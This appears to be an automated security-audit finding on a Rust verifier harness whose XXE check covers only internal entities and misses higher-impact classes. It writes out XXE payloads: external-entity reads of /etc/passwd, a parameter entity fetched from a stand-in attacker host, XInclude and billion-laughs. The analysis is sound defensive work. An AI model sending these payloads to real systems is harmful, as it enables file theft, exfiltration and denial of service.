record_exploration_finding
{
  "path": "crates/nyctos/src/ai_pipeline.rs",
  "line": 2162,
  "cap": "XXE_COVERAGE_TUNNEL_VISION",
  "endpoint": "internal: builtin_harness_for_cap(\"XXE\") at ai_pipeline.rs:2162-2178 drives `xml.parsers.expat.ParserCreate()` directly with default settings: no `parser.SetParamEntityParsing(EXPAT_PARAM_ENTITY_PARSING_NEVER)`, no entity-expansion limit, no DOCTYPE / DTD handler, no `parser.UseForeignDTD` override, and no external-entity resolver hook.",
  "rationale": "Python's `xml.parsers.expat` parser ships with a default that BLOCKS external entity resolution (`SetParamEntityParsing` defaults to `XML_PARAM_ENTITY_PARSING_NEVER`) — a reasonable safety default for a hardened parser. But this default DEFINES the verifier's coverage: the harness's CharacterDataHandler captures the text content of element nodes after expat applies its built-in expansion logic. The classes of XXE the harness can confirm are STRICTLY a subset of what expat-with-defaults processes.\n\n**The harness CAN confirm** (very small set):\n- Internal general entities: `<!ENTITY x \"TOP_SECRET_XXE\">` + `<r>&x;</r>` → CharacterDataHandler emits the marker. The canonical-test-payload class.\n- Standard predefined entities (`&amp;` etc.) — but these are no-vuln noise.\n\n**The harness CANNOT confirm** (the high-value XXE classes that drive the real-world threat model):\n\n(1) **External general entities → arbitrary file read** (`<!ENTITY x SYSTEM \"file:///etc/passwd\">` + `<r>&x;</r>`): the highest-value classic XXE primitive. Expat-with-defaults does not resolve the external entity; CharacterDataHandler receives no text; oracle does not fire; candidate is DISMISSED — but this is exactly the candidate class an LLM correctly emits when it finds `lxml.etree.parse(user_xml)` or `xml.dom.minidom.parseString(user_xml)` with default-resolver in the candidate code. The candidate's real code path (lxml, minidom) DOES resolve external entities by default in older Python versions and on some lxml configurations; the verifier's expat-with-defaults does NOT. The verifier produces a Dismissed verdict, the per-path promotion rate (sentinel #65) ratchets DOWN, future AI budget on that path is starved — exactly the wrong direction.\n\n(2) **External parameter entities → out-of-band exfil** (`<!ENTITY % p SYSTEM \"http://attacker/dtd\">` + DTD references the parameter entity): the high-value OOB-exfil primitive that bypasses no-stdout-leak postures. Expat-with-defaults does not fetch the external DTD; oracle does not fire; candidate Dismissed.\n\n(3) **XInclude expansion**: `<xi:include href=\"file:///etc/passwd\"/>` requires `lxml.etree.XInclude()` or `xml.etree.ElementTree.XInclude` post-processing. Expat raw does NOT apply XInclude; the harness explicitly uses raw expat (not ElementTree, not lxml); candidate Dismissed even though the candidate code path may invoke `tree.xinclude()`.\n\n(4) **Billion-laughs / quadratic-blowup DoS**: `<!ENTITY a \"aa\">` + `<!ENTITY b \"&a;&a;...\">` + nested chains. The harness has NO entity-expansion limit (Python's expat exposes `parser.SetParamEntityParsing` but not a direct expansion-depth cap; OPENWALL's `defusedxml` library was created precisely because the stdlib's expat allows unbounded expansion). A nested 5-deep payload expands to ~10^10 characters; the CharacterDataHandler is called incrementally so the marker text reaches `out` BEFORE the explosion completes if the marker appears at the innermost entity — the oracle MAY fire on a Class-1-like setup, but the harness consumes O(N^5) memory before exiting; on the `process` sandbox lane with the default rlimit (which sentinel #62-#64 documented as USD-budget-bounded, not RSS-bounded for verifier python), the harness OOMs the sandbox. Either outcome (oracle fires + OOM, or OOM before stdout flushes) makes the harness's outcome ENVIRONMENT-DEPENDENT — chains with sentinel #68.\n\n(5) **CDATA-section injection** and **DTD-driven attribute defaulting**: the harness's CharacterDataHandler captures text content but NOT attribute values; an attacker payload exploiting attribute defaults via DTD does not reach the oracle.\n\n(6) **Namespace-bound entity tricks** / **xmlns: attribute injection**: same — not captured.\n\nThe asymmetry between (i) the candidate-emission surface (the LLM correctly emits XXE candidates from source code that uses lxml/minidom/ElementTree-with-XInclude, the high-value parsers) and (ii) the verifier-confirmation surface (raw expat with default-blocked external-entity resolution) means the verifier acts as a **selective-promotion filter that confirms only the lowest-impact XXE class and silently dismisses the high-impact classes**. The per-path promotion rate (sentinel #65 feedback loop) ratchets the AI exploration budget AWAY from the paths that ship lxml/minidom (where the real XXE bugs live) and TOWARDS the paths that ship raw expat with internal entities (where the bug class is least valuable).\n\nThis duplicates the structural pattern in sentinel #65 (PATH_TRAVERSAL: only POSIX-cat with literal `../`, dismisses URL-encoded / zip-slip / template-loader) but applied to a NEW cap. The diff inherits the same architectural defect.\n\nAdditionally — independent of the coverage classes — three secondary observations:\n\n(a) **The doc-comment at ai_pipeline.rs:2165-2169 says \"exercises the DOCTYPE + ENTITY parse path that defines the XXE class\"** — this is misleading. The harness exercises *one* path on the XXE branch (internal general entity); the harness does not exercise the DOCTYPE-SYSTEM path, the parameter-entity path, the XInclude path, or any external-resolver path. A future reviewer reading the doc comment cannot tell that the harness's actual scope is much narrower than the cap's threat model.\n\n(b) **No `parser.DefaultHandler` is installed** — so payloads that route their content through paths expat does not have a specific handler for (e.g. comments, processing instructions) are silently dropped. The harness sees only what `CharacterDataHandler` is told about. A test that defines the marker inside a `<!-- TOP_SECRET_XXE -->` comment does not fire the oracle even though the marker bytes reached the parser.\n\n(c) **The benign control `<r>workspace</r>` validates ONLY that well-formed XML without entities parses without marker** — it does not validate that any of the high-value XXE classes (a)-(f) above do NOT inadvertently fire the oracle when they should be Dismissed. Compounds with finding #73 (literal reflection): a benign-looking XML payload that *happens* to contain the marker text as element content fires the oracle and confirms a non-XXE candidate.\n\nDistinct from sentinel #65 (PATH_TRAVERSAL coverage classes — same architectural defect, different cap), #66 (synthetic-vs-bound provenance — applies here too), #67 (marker collision — see #73 for the XXE-specific collision), #73 (literal reflection — applies here too but is a separate axis: this finding is about WHAT-CLASSES-EXIST, #73 is about WHEN-DOES-THE-ORACLE-FIRE-WRONGLY).\n\nStatic pass missed because the bug is a *narrowness-of-coverage* property at the boundary between the candidate-emission and verifier-confirmation surfaces — no flow analysis is involved.\n\nMitigations (recommend 1+2+3): (1) **add at least one harness invocation that uses `lxml.etree` instead of raw expat** (gated by `try: import lxml.etree`; if absent the cap routes to the candidate-pipeline per sentinel #71 mitigations); inside the lxml-harness, deliberately set `resolve_entities=True` and `huge_tree=False` and `no_network=False` to a controlled in-process resolver that returns the marker when the entity URL matches a known-test URL; the harness then can confirm external-entity classes (1) and (2). Mark such confirmations as `Bound(lxml)` vs `Bound(expat)` for downstream provenance. (2) **emit a per-candidate `verifier.coverage_class` label** (echoing sentinel #65 mitigation (1)) — `xxe_internal_general_entity`, `xxe_external_general_entity_attempted`, `xxe_param_entity_attempted`, `xxe_xinclude_attempted` — derived from a quick pickletools-style introspection of the payload bytes (`<!ENTITY` ... `SYSTEM` substring → `external`); when the oracle does NOT fire AND the introspection says the payload attempted an external-class primitive, the verdict is `Inconclusive` not `Dismissed`. (3) **install `parser.DefaultHandler` and `parser.ExternalEntityRefHandler`** so the harness can DISTINGUISH \"payload tried to expand external entity\" (handler fires with the URL) from \"payload did not try\" (handler does not fire); record this distinction in the verifier trace. (4) **add an explicit billion-laughs guard** — install `parser.SetEntityDeclHandler` to count entity declarations and refuse to process payloads with > N nested entity references; the runner returns `VerifyVerdict::Errored { reason: HarnessRejectedExpansionBomb }` rather than running into the sandbox's OOM-killer; chains with sentinel #68 mitigation (2).",
  "suggested_payload_hint": "Verifier seed (unit test in ai_pipeline.rs's tests module): `xxe_harness_reports_inconclusive_for_external_general_entity_payload` — insert a CandidateFindingRecord with `cap=\"XXE\"` and `suggested_payload_hint=Some(\"<?xml version=\\\"1.0\\\"?><!DOCTYPE r [<!ENTITY x SYSTEM \\\"file:///etc/hostname\\\">]><r>&x;</r>\".to_string())`; today the harness's expat refuses the external entity (default no-resolve), CharacterDataHandler emits nothing, oracle does not fire, candidate row lands `Dismissed`. Under mitigation (2), assert the row lands `Inconclusive` (or `coverage_class=xxe_external_general_entity_attempted`) — NOT `Dismissed` — so the per-path promotion-rate signal is not biased. End-to-end: `xxe_harness_does_not_oom_on_billion_laughs` — insert candidate with the standard 4-level billion-laughs payload (\"<!ENTITY a 'aa'><!ENTITY b '&a;&a;&a;...'><!ENTITY c '&b;&b;...'><!ENTITY d '&c;&c;...'><r>&d;</r>\"); today the harness either OOMs the sandbox or runs to ~10^4 expansion and emits the (empty if no marker) text; under mitigation (4), assert `report.verifier_errors` contains a `HarnessRejectedExpansionBomb` for this candidate. Coverage-class test: insert 5 candidates spanning {internal general entity, external general entity, external parameter entity, XInclude, billion-laughs} and assert the verifier trace contains a `coverage_class` label distinguishing them; today all 5 collapse to `Dismissed` or `Promoted` based solely on oracle substring match."
